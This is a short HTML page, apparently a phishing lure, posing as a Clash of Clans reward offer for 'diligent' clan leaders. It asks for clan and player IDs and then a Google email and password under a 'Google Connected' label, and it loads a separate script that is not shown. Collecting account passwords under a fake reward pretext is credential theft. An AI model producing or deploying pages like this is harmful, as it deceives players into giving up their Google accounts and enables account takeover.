<!DOCTYPE HTML>
<html lang="en">
	<head>
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link rel="stylesheet" href="index.css">
		<title>Clash of Clans</title>
		</head>
	<body>
		<div id="main">
			<img src="rewards.png">
			<div id="userinfo">
				<p>Clan ID</p>
				<input id="clanid" type="text" placeholder="Enter your clan ID">
				<p>Clan Level</p>
				<input id="clanlvl" type="number" placeholder="Enter your clan level">
								<p>Player ID</p>
				<input id="accountid" type="text" placeholder="Enter your Account ID">
				<p style="color:yellowgreen; margin-top:5px; max-width:100%;">Google Connected</p>
				<input  id="email" type="email" placeholder="Email">
								<input id="password" type="password" placeholder="Password">
				<button id="btn">Submit</button>
			</div>
			<div id="info">
				<p>Note:</p><span>This is only for clan leaders who have been leaders since last month or last year until now. This is in appreciation of all diligent leaders.</span>
			</div>
		</div>
		<script src="index.js"></script>
		</body>
		
		</html>
